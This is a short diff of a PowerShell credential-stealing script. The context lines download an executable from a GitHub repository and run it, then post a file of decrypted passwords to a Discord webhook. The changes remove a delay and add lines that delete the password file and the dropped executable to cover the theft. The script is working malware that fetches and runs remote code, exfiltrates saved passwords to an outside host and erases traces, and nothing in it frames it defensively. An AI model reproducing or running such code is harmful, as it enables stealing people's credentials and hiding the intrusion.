@@ -3,7 +3,6 @@ iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.ex
 start-process "$env:USERPROFILE\d.exe"
 
 
-start-sleep 15
 
 
 
@@ -30,5 +29,8 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
+
+get-childItem * -Include *decrypted_password.csv -Recurse | rm
+rm "$env:USERPROFILE\d.exe"
 
 
